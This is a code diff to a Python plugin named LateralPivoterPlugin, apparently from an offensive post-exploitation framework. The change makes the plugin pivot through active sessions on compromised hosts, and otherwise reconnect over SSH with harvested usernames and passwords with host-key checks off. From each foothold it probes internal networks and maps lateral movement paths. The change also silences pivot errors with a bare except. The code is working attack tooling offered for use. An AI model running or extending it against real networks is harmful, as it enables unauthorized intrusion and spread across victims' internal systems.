@@ -25,26 +25,42 @@ class LateralPivoterPlugin(BasePlugin):
         return []
 
     async def run(self, target, data):
+        # Prefer active sessions for pivoting
+        sessions = self.session_manager.list_sessions()
         compromised_hosts = data.get('compromised_hosts', {})
-        if not compromised_hosts:
+
+        if not sessions and not compromised_hosts:
             return
 
-        print(f"[*] Starting LateralPivoter internal discovery...")
+        print(f"[*] Starting LateralPivoter internal discovery via active assets...")
         lateral_paths = {}
 
+        # 1. Use existing sessions
+        for session in sessions:
+            if session.status == "Active":
+                print(f"[*] Pivoting through Session {session.id} ({session.target})...")
+                try:
+                    discovered_ips = await self.probe_internal_network(session.conn)
+                    if discovered_ips:
+                        print(f"    [!!!] DISCOVERED {len(discovered_ips)} internal nodes via Session {session.id}")
+                        lateral_paths[session.target] = discovered_ips
+                except Exception as e:
+                    print(f"[!] Pivot failed for Session {session.id}: {e}")
+
+        # 2. Fallback to compromised hosts without sessions
         for ip, creds in compromised_hosts.items():
+            if ip in lateral_paths: continue # Already did this one
             for cred in creds:
                 if cred['service'] == 'ssh':
-                    print(f"[*] Pivoting through {ip} to discover internal nodes...")
+                    print(f"[*] Pivoting through {ip} (new connection)...")
                     try:
                         async with asyncssh.connect(ip, username=cred['username'], password=cred['password'], known_hosts=None) as conn:
-                            # Discover internal IPs via ARP and Routing
                             discovered_ips = await self.probe_internal_network(conn)
                             if discovered_ips:
                                 print(f"    [!!!] DISCOVERED {len(discovered_ips)} internal nodes via {ip}")
                                 lateral_paths[ip] = discovered_ips
                         break
-                    except Exception as e:
-                        print(f"[!] Pivot failed for {ip}: {e}")
+                    except:
+                        pass
 
         data['lateral_movement_paths'] = lateral_paths
